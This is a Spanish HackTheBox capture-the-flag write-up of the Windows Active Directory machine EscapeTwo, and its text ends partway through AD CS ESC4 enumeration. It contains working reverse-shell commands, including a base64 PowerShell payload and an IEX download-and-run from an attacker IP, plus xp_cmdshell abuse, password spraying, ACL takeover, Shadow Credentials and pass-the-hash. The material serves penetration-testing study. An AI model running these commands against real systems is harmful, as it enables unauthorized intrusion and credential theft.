---
title: EscapeTwo - Easy (HTB)
permalink: /EscapeTwo-HTB-Writeup/
tags:
  - "Windows"
  - "Easy"
  - "RPC Enumeration"
  - "SMB Enumeration"
  - "xp_cmdshell"
  - "BloodHound"
  - "ACL Rights"
  - "WriteOwner"
  - "GenericAll"
  - "Shadow Credentials"
  - "AD CS"
  - "ESC4"
  - "PassTheHash"
  - "PassTheCert"
categories:
  - writeup
  - hacking
  - hackthebox
  - "active directory"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo_tittle: EscapeTwo - Easy (HTB)
seo_description: Aprende enumeración y explotación de fallos en servicios de Active Directory y eleva tus privilegios mediante el abuso de certificados en AD CS para vencer EscapeTwo.
excerpt: Aprende enumeración y explotación de fallos en servicios de Active Directory y eleva tus privilegios mediante el abuso de certificados en AD CS para vencer EscapeTwo.
header:
  overlay_image: /assets/images/headers/escapeTwo-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/escapeTwo-hackthebox.jpg
---

![image-center](/assets/images/posts/escapeTwo-hackthebox.png){: .align-center}

**Habilidades:** RPC Enumeration, SMB Enumeration, Information Leakage, Abusing xp_cmdshell, DC Enumeration - BloodHound Analysis, Abusing ACL - `WriteOwner` Rights, Shadow Credentials, Abusing AD CS - `ESC4`, PassTheCertificate, PassTheHash
{: .notice--primary}

# Introducción

EscapeTwo es una máquina Windows de dificultad `Easy` en HackTheBox, donde debemos vulnerar un escenario de Active Directory a través de diferentes técnicas de enumeración y explotación de servicios con fallos de configuración, abusaremos de AD CS para obtener privilegios elevados dentro del dominio. 

En este caso HackTheBox nos proporciona unas credenciales válidas de usuario en el siguiente mensaje:

> Machine Information
> 
> As is common in real life Windows pentests, you will start this box with credentials for the following account: `rose`/`KxEPkKe6R8su`
{: .notice--info}
<br>
# Reconocimiento
---
Antes de comenzar a escanear puertos, comprobaremos que tenemos conectividad con la máquina víctima a través de una traza ICMP

~~~ bash
ping -c 1 10.10.11.51
PING 10.10.11.51 (10.10.11.51) 56(84) bytes of data.
64 bytes from 10.10.11.51: icmp_seq=1 ttl=127 time=287 ms

--- 10.10.11.51 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 286.879/286.879/286.879/0.000 ms
~~~


## Nmap Scanning 

Empezaremos la fase de reconocimiento con un escaneo exhaustivo utilizando la herramienta `nmap` con el fin de descubrir los puertos abiertos en la máquina víctima

~~~ bash
nmap --open -p- --min-rate 5000 -n -sS -v -Pn 10.10.11.51 -oG openPorts

Completed SYN Stealth Scan at 13:46, 26.52s elapsed (65535 total ports)
Nmap scan report for 10.10.11.51
Host is up (0.16s latency).
Not shown: 65509 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49706/tcp open  unknown
49722/tcp open  unknown
49743/tcp open  unknown
49818/tcp open  unknown
~~~

Haremos un segundo escaneo con el propósito de obtener detalles de la versión y el servicio que se ejecuta en cada uno de los puertos que descubrimos

~~~bash
nmap -sVC -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49689,49690,49691,49706,49722,49743,49818 10.10.11.51 -oN services

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-05 18:49:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-05T18:50:44+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-05T18:50:44+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-02-05T18:50:44+00:00; -1s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-02-05T16:05:49
|_Not valid after:  2055-02-05T16:05:49
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-05T18:50:44+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-05T18:50:44+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49743/tcp open  msrpc         Microsoft Windows RPC
49818/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-02-05T18:50:05
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb  5 13:50:47 2025 -- 1 IP address (1 host up) scanned in 109.47 seconds
~~~

Analizando la captura podemos ver que el dominio se llama `sequel.htb` y que el controlador de dominio es `dc01.sequel.htb`, agregaremos esta información al archivo `/etc/hosts` con el siguiente comando **como el usuario root**

~~~ bash
sudo echo '10.10.11.51 sequel.htb dc01.sequel.htb' >> /etc/hosts
~~~


## RPC Enumeration

Primeramente intentaremos conectarnos con una sesión nula y verificar si podemos enumerar información del dominio

~~~ bash
rpcclient -U "" -N 10.10.11.51 -c querydispinfo

result was NT_STATUS_ACCESS_DENIED
~~~

No podemos acceder mediante una sesión anónima, entonces utilizaremos las credenciales que se nos han proporcionado (`rose:KxEPkKe6R8su`)

~~~ bash
rpcclient -U "rose%KxEPkKe6R8su" 10.10.11.51 -c enumdomusers | grep -oP 'user:\[\K[^\]]+' > users.txt

Administrator
Guest
krbtgt
michael
ryan
oscar
sql_svc
rose
ca_svc
~~~

Guardamos la información rápidamente en un archivo `users.txt` para contar con una lista de los usuarios existentes en el dominio

### Groups and Users

Si hacemos una enumeración de los grupos con el comando `eunmdomgroups`, veremos diversos departamentos como `Sales`, `Human Resources`, `Accounting` o `Management`, automatizaremos la búsqueda de estos grupos además de listar los miembros de cada grupo

~~~ bash
for group in $(seq 2 6); do rpcclient -U "rose%KxEPkKe6R8su" 10.10.11.51 -c 'enumdomgroups' | grep "0x64$group" | awk '{print $2,$3}' FS=':'; rpcclient -U "rose%KxEPkKe6R8su" 10.10.11.51 -c "queryuser $(rpcclient -U "rose%KxEPkKe6R8su" 10.10.11.51 -c "querygroupmem 0x64$group" | awk '{print $2}' FS=':' | tr -d '[]' | awk '{print $1}')" | grep -i 'user name'; done | grep -v 'Usage'

[Management Department] rid [0x642]
	User Name   :	ryan
[Sales Department] rid [0x643]
[Accounting Department] rid [0x644]
	User Name   :	oscar
[Reception Department] rid [0x645]
[Human Resources Department] rid [0x646]
~~~

Con esto ya sabríamos que el usuario `ryan` pertenece al departamento `Management` además de que `oscar` pertenece al departamento `Accounting`
<br>


# Intrusión / Explotación
---
## SMB Enumeration

Investigando los recursos compartidos a través por la red, podemos ver que existe una carpeta `Accounting Department`, encontraremos dos archivos de `excel`, los inspeccionaremos con `LibreOffice`

~~~ bash
smbclient //10.10.11.51/'Accounting Department'/ -U 'sequel.htb/rose%KxEPkKe6R8su' 

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024

		6367231 blocks of size 4096. 928113 blocks available

smb: \> get accounts.xlsx
getting file \accounts.xlsx of size 6780 as accounts.xlsx (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)

smb: \> get accounting_2024.xlsx 
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (8.3 KiloBytes/sec) (average 2.4 KiloBytes/sec)
~~~

Si ocurre un error con el formato para abrirlo con `LibreOffice` podemos leer directamente el contenido del archivo al hacerle un pequeño tratamiento.

Descomprimiremos el archivo en una carpeta `accounts` donde alojaremos todos los archivos correspondientes al archivo `accounts.xlsx`

~~~ bash
unzip accounts.xlsx -d accounts 
Archive:  accounts.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: accounts/xl/workbook.xml  
  inflating: accounts/xl/theme/theme1.xml  
  inflating: accounts/xl/styles.xml  
  inflating: accounts/xl/worksheets/_rels/sheet1.xml.rels  
  inflating: accounts/xl/worksheets/sheet1.xml  
  inflating: accounts/xl/sharedStrings.xml  
  inflating: accounts/_rels/.rels    
  inflating: accounts/docProps/core.xml  
  inflating: accounts/docProps/app.xml  
  inflating: accounts/docProps/custom.xml  
  inflating: accounts/[Content_Types].xml
~~~

### Information Leakage - `accounts.xlsx`

El contenido se encuentra almacenado en el archivo `.accounts/xl/sharedStrings.xml`, podemos hacer un tratamiento para ver la información de forma más intuitiva. Guardaremos

~~~ bash
cat accounts/xl/sharedStrings.xml | grep -oP '<t xml:space="preserve">\K[^<]+' | grep -vE "First Name|Last Name|Password|Email|Username" | paste - - - - - | column -s $'\t' -t

Angela  Martin         angela@sequel.htb  angela          0fwz7Q4mSpurIt99
Oscar   Martinez       oscar@sequel.htb   oscar           86LxLBMgEWaKUnBG
Kevin   Malone         kevin@sequel.htb   kevin           Md9Wlq1E5bZnVDVo
NULL    sa@sequel.htb  sa                 MSSQLP@ssw0rd!
~~~

Veremos la información de la siguiente forma organizada por columnas, aunque la última columna tendrá valores nulos.


## SQL Server - `msssqlclient.py`

Tenemos credenciales para la cuenta `sa`. Nos conectaremos con un cliente `SQL Server` a la máquina víctima

~~~ bash
mssqlclient.py sequel.htb/sa@sequel.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 
~~~


## Abusing `xp_cmdshell` - SQL Server

Activaremos el procedimiento almacenado de `xp_cmdshell` para ejecutar comandos en la máquina ejecutando esta serie de queries SQL

- La siguiente forma de activar `xp_cmdshell` es posible mediante el uso de `mssqlclient.py`, de lo contrario podríamos habilitar este procedimiento almacenado de la forma que se muestra más abajo

~~~ bash
enable xp_cmdshell
~~~

> Habilitando `xp_cmdshell` de forma manual

~~~ bash
SQL> EXEC sp_configure 'show advanced options', 1
[*] INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
[*] INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';              
output

-------------------------------------------------------------------------------------

sequel\sql_svc
~~~


## Shell as `svc_sql`
### 1. Reverse Shell via Powershell `base64` Encoded Command

Una vez activamos `xp_cmdshell`, lanzaremos una reverse shell a nuestra máquina de atacante por un puerto, en mi caso, el `443`. Podemos construir una reverse shell fácilmente en `revshells.com` en `base64`

~~~ bash
# Listener
rlwrap nc -lvnp 443

# Máquina víctima
SQL> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMwA3ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
~~~


### 2. Reverse Shell via `IEX()` Function

Una gran alternativa si no podemos ejecutar una cantidad elevada de caracteres (se da en algunos escenarios donde no tenemos una consola `mssql`), sería enviarnos una solicitud HTTP a un recurso que estemos alojando en nuestra máquina para que interprete un script de `powershell`

~~~ sql
SQL> xp_cmdshell "powershell -c IEX(New-Object Net.WebClient).downloadString(''http://10.10.15.37/reverse.ps1'')" 
~~~

Antes de ejecutar esta sentencia, debemos disponer de `reverse.ps1`. Para este ejemplo usaré un script simple del repositorio de `nishang`, estos ejemplos de scripts vienen previamente instalados en `parrot` al menos

~~~ bash
cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 reverse.ps1

# Editamos el script para que nos envíe la consola de Powershell a nuestra máquina en la función TCPCLient
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.37',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
~~~

![image-center](/assets/images/posts/escapeTwo-reverse-shell.png){: .align-center}


## Credentials Leakage

Inspeccionando los archivos de la máquina, vemos un directorio `SQL2019` que contiene un archivo de configuración de `sql`

~~~ bash
PS C:\Users> type "C:\SQL2019/ExpressAdv_ENU/sql-configuration.INI"
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3" # AQUÍ!
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
~~~


## Password Spraying - `kerberos`

Veamos para qué usuario es válida esta contraseña que acabamos de encontrar usando el protocolo `kerberos`

~~~ bash
/opt/kerbrute/kerbrute-1.0.3/kerbrute passwordspray -d sequel.htb --dc 10.10.11.51 users.txt 'WqSZAF6CysDQbGb3'    

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/09/25 - Ronnie Flathers @ropnop

2025/02/09 20:57:38 >  Using KDC(s):
2025/02/09 20:57:38 >  	10.10.11.51:88

2025/02/09 20:57:38 >  [+] VALID LOGIN:	sql_svc@sequel.htb:WqS...
2025/02/09 20:57:38 >  [+] VALID LOGIN:	ryan@sequel.htb:WqS...
2025/02/09 20:57:38 >  Done! Tested 12 logins (2 successes) in 0.618 seconds
~~~

Y son válidas para la cuenta `sql_svc` y para el usuario `ryan`, si verificamos una conexión a través de `winrm` 

~~~ bash
nxc winrm  10.10.11.51 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
~~~


## Shell as `ryan`

Como son válidas estas credenciales y nos muestra `Pwned!`, sabemos que el usuario `ryan` forma parte del grupo `Remote Management Users`, lo que le otorga la capacidad de obtener una consola de `powershell` a través de `winrm`

~~~ bash
evil-winrm -i 10.10.11.51 -u 'ryan' -p 'WqSZAF6CysDQbGb3'                                        
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\ryan\Documents> 
~~~

En este punto ya podemos ver la flag del usuario no privilegiado

~~~ bash
*Evil-WinRM* PS C:\Users\ryan\Documents> type ..\Desktop\user.txt
81e...
~~~
<br>


# Escalada de Privilegios
---
## DC Enumeration - BloodHound Analysis

Analizaremos la estructura del dominio con BloodHound para encontrar rutas potenciales para escalar nuestros privilegios en el dominio

~~~ bash
bloodhound-python -d sequel.htb -c All -ns 10.10.11.51 --zip -u 'ryan' -p 'WqS...'
~~~

Encontraremos el siguiente objeto el cual el usuario `ryan` posee control

![image-center](/assets/images/posts/escapeTwo-bloodhound-1.png){: .align-center}


## Abusing ACL - `WriteOwner` Rights

El usuario `ryan` tiene derechos `WriteOwner` sobre la cuenta `ca_svc`. Esto permite modificar el propietario de esta cuenta. Podemos aprovechar esto para posteriormente extraer el hash `NT` de la cuenta `ca_svc` y hacer `PassTheHash`.

Primeramente asignaremos a `ryan` como el propietario de la cuenta `ca_svc` 

~~~ bash
owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' sequel.htb/ryan
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] No credentials supplied, supply password
Password:
[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
~~~

### Verifying via `powershell`

A continuación podemos verificar la operación desde una sesión como el usuario `ryan` mediante `evil-winrm`

~~~ powershell
# Before
*Evil-WinRM* PS C:\Users\ryan\Documents> $user = Get-ADObject -Identity "CN=Certification Authority,CN=Users,DC=sequel,DC=htb" -Properties ntSecurityDescriptor
*Evil-WinRM* PS C:\Users\ryan\Documents> $user.nTSecurityDescriptor.Owner
SEQUEL\Domain Admins

# After
*Evil-WinRM* PS C:\Users\ryan\Documents> $user = Get-ADObject -Identity "CN=Certification Authority,CN=Users,DC=sequel,DC=htb" -Properties ntSecurityDescriptor
*Evil-WinRM* PS C:\Users\ryan\Documents> $user.nTSecurityDescriptor.Owner

SEQUEL\ryan
~~~

### Granting `GenericAll` Rights to `ca_svc` Account

Modificaremos la lista de control de acceso para asignarle al usuario `ryan` control total sobre la cuenta `ca_svc`, lo haremos con la herramienta `dacledit.py` 

~~~ bash
dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' sequel.htb/ryan
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] No credentials supplied, supply password
Password:
[*] DACL backed up to dacledit-20250209-214403.bak
[*] DACL modified successfully!
~~~


## Shadow Credentials

Ahora podremos extraer el hash `NT` del usuario `ca_svc`, podemos hacerlo mediante `Shadow Credentials` con `certipy` o con `pywhisker`. **Para este ataque no debemos dejar pasar mucho tiempo, si los permisos dan conflictos, vuelve a cambiar el propietario y permisos con `owneredit` y `dacledit`**

### 1. `certipy`

Este método es más "sencillo" dado que automatiza la manipulación de `msDS-KeyCredentialLink`, generando un certificado válido para autenticarse como `ca_svc` y por ende, obteniendo el hash `NT` al instante

~~~ bash
certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'da4f3845-ac34-7d4a-78b4-a8d0ae18fe4b'
[*] Adding Key Credential with device ID 'da4f3845-ac34-7d4a-78b4-a8d0ae18fe4b' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'da4f3845-ac34-7d4a-78b4-a8d0ae18fe4b' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
~~~

### 2. `pywhisker`

Este método modifica el atributo `msDS-KeyCredentialLink` del objeto `ca_svc` en el dominio para asociar una clave controlada por nosotros. Esto permite autenticarnos como la cuenta `ca_svc` usando certificados sin conocer su contraseña real

~~~ bash
pywhisker -d "sequel.htb" -u "ryan" -p 'WqSZAF6CysDQbGb3' --target "ca_svc" --action "add"
[*] Searching for the target account
[*] Target user found: CN=Certification Authority,CN=Users,DC=sequel,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 150b6f3e-e2e0-8611-8733-c55372fa73d5
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: u1IRYGJ6.pfx
[*] Must be used with password: hzw5UbmyDVK752YXoLS9
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
~~~

Usaremos la herramienta `gettgtpkinit` para obtener un `TGT` válido para la cuenta `ca_svc`

~~~ bash
python3 gettgtpkinit.py sequel.htb/ca_svc -cert-pfx u1IRYGJ6.pfx -pfx-pass hzw5UbmyDVK752YXoLS9 ticket.ccache 
~~~

Usando este `TGT` ahora podremos ver el hash `NT` de la cuenta `ca_svc`

~~~ bash
export KRB5CCNAME=ticket.ccache                          
python3 getnthash.py sequel.htb/ca_svc -key 62628325bbcef3f6b625ef46be6e88b28bec94ff97dbc4bc4b96082650e679e6
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
3b181b914e7a9d5508ea1e20bc2b7fce
~~~


## Shell as `ca_svc`

Podemos validar con `netexec` el hash que obtuvimos de la cuenta `ca_svc`

~~~ bash
nxc smb 10.10.11.51 -u 'ca_svc' -H '3b181b914e7a9d5508ea1e20bc2b7fce'  
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\ca_svc:3b181...
~~~

Si lo intentamos validar el en protocolo `winrm`, no será válido

~~~ bash
nxc winrm 10.10.11.51 -u ca_svc -H '3b181b914e7a9d5508ea1e20bc2b7fce'
WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\ca_svc:3b181b914e7a9d5508ea1e20bc2b7fce
~~~


## Requesting TGT - `ca_svc`

Solicitaremos un `Ticket Granting Ticket` para utilizar una autenticación mediante `kerberos` en vez de emplear las credenciales

~~~ bash
getTGT.py sequel.htb/ca_svc -dc-ip 10.10.11.51 -hashes '3b181b914e7a9d5508ea1e20bc2b7fce'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in ca_svc.ccache
~~~

Para continuar, debemos cargar el ticket como una variable de entorno

~~~
export KRB5CCNAME=ca_svc.ccache
~~~


## Abusing AD CS - `ESC4` 

Podemos encontrar plantillas vulnerables para la cuenta `ca_svc` de las que podamos abusar con `certipy`

~~~ bash
certipy find -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -dc-ip 10.10.11.51 -vulnerable

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
